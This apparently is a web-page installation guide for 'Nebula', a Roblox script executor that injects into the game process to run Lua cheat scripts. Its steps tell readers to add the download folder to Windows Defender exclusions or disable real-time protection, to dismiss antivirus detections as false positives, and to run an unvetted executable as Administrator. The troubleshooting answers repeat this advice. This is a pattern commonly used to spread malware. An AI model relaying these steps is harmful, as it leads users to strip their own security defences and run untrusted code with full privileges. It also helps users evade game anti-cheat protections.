Installation Process

Follow these steps in order to ensure your executor attaches and executes correctly.

01

Download Release & Extract

Get the latest release from the official GitHub repository. Once downloaded, extract the ZIP folder to a dedicated location on your desktop or a folder of your choice.

https://github.com/23Pulto/Roblox-Executor/releases
02

Security Exclusions (Important)

To prevent Windows Defender from deleting or blocking the executor, add the extracted folder to your Virus & Threat Protection exclusions. You can also temporarily disable real-time protection.

Settings > Security > Virus & threat protection > Manage settings > Add or remove exclusions.

⚠️
False Positive Notice: Executors are often flagged as "False Positives" due to their injection methods. Adding an exclusion ensures the files are not removed.
03

Launch Roblox (Web Version)

Open your browser and launch any Roblox game via the website. Note: The Microsoft Store (UWP) version is currently not supported. Make sure you are in a live game before proceeding.

04

Run Executor as Admin & Inject

Navigate to the extracted folder and locate Roblox.exe or Nebula Services.exe (depending on the release). Right-click and select "Run as Administrator" to launch the executor.

▶ Run "Nebula Services.exe" as Administrator
05

Wait for Initialization

After launching the executor, wait approximately 5 seconds for it to fully load and attach to the Roblox process. You may see a console window or a status indicator showing that the injection was successful.

⏳
Loading Time: Be patient — the executor needs a few seconds to map its internal components. Do not close any windows during this time.
06

Open the Menu (Insert Key)

Once the executor has finished loading, press the Insert key on your keyboard while in the Roblox game window. The Nebula menu should appear on-screen, confirming that everything is working correctly.

✔️ Menu Toggle: INSERT key
07

Execute Scripts & Enjoy

With the menu open, you can paste your Lua scripts into the executor's interface and click "Execute" to run them. Your scripts will now function inside the Roblox environment.

Common Issues

Encountering problems? Check these common fixes below.

Executor closes immediately or file is missing.

This is almost always caused by Windows Defender. Go back to Step 02 and add the entire extracted folder to your exclusions list. Then re-extract the ZIP and try again.

Menu does not appear after pressing Insert.

Ensure that you waited the full 5 seconds after running the executor. Also make sure Roblox is the active window (click on the game). If it still doesn't work, try running "Nebula Services.exe" as Administrator again.

"Roblox.exe" or "Nebula Services.exe" is not found.

Make sure you have extracted the entire ZIP folder. Some antivirus programs silently delete files. Temporarily disable real-time protection, re-extract, and add the folder to exclusions.

Executor says "Attach failed" or "Injection error".

Close Roblox and the executor completely. Re-launch Roblox first, join a game, then run the executor as Administrator. Do not run the executor before Roblox is active.

Does this work on all Roblox games?

Yes, Nebula works on the majority of Roblox games that do not have special anti-tamper protections. Avoid using it on games with strict anti-exploit systems.
